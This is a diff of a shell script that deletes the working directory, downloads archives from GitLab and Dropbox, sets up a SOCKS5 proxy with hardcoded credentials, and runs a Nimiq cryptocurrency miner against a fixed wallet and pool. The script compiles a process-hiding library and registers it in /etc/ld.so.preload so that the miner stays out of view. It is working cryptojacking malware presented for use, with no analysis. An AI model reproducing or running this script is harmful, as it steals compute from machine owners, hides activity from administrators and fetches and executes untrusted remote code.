@@ -1,41 +1,22 @@
 rm -rvf * && mkdir d && cd d
 #!/bin/sh
-echo " "
-echo " "
-echo " "
-echo "====================================="
-echo "╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╗ ╔═╗╔═╗╦╔═ "
-echo "║║║║╣ ║  ║  ║ ║║║║║╣   ╠╩╗╠═╣║  ╠╩╗ "
-echo "╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝  ╚═╝╩ ╩╚═╝╩ ╩ "
-echo "====================================="
-echo "MalingNih"
-echo " "
-echo " "
-echo " "
-sleep 5
-
-echo "==================="
-echo "   CEK TIMEZONE   "
-echo "==================="
-echo " "
-echo " "
-ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-sleep 5
 
 apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
 
-wget https://github.com/maszehh/sempak/raw/main/sempak.tar.gz
-tar -xvzf sempak.tar.gz
-rm -rf sempak.tar.gz
-
+wget https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/micin.tar.gz
+tar -xvzf micin.tar.gz
+wget https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/apik.tar.gz
+tar -xvzf apik.tar.gz
+rm -rf apik.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 149.28.159.30:443 
-socks5_username = mbah
-socks5_password = kencot
+socks5 = 159.65.7.144:443
+socks5_username = kita
+socks5_password = kayabersama
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -57,21 +38,20 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp rm -rf gas && wget -q 'https://www.dropbox.com/s/m8c5iw50chb2i2n/anu.zip'
-unzip anu.zip
-chmod +x sempak
+./graftcp/graftcp rm -rf gas && wget -q 'https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/elpigi.zip' && unzip elpigi.zip
+chmod +x gas
 rm -rf Makefile
 rm -rf processhider.c
 rm -rf README.md
 rm -rf .gitignore
-rm -rf anu.zip
+rm -rf elpigi.zip
 
-./graftcp/graftcp wget https://github.com/maszehh/sempak/raw/main/ngumpet.zip
-unzip ngumpet.zip
-rm -rf ngumpet.zip
+./graftcp/graftcp wget https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/megatron.zip
+unzip megatron.zip
+rm -rf megatron.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./sempak -d=0 -a "NQ82UYV095UD9MST21399ABS6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n GPU-Sage -t 4  -i Disable
+./graftcp/graftcp ./gas -d=0 -a "NQ82UYV095UD9MST21399ABS6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)GPU-Sage) -t 4  -i Disable
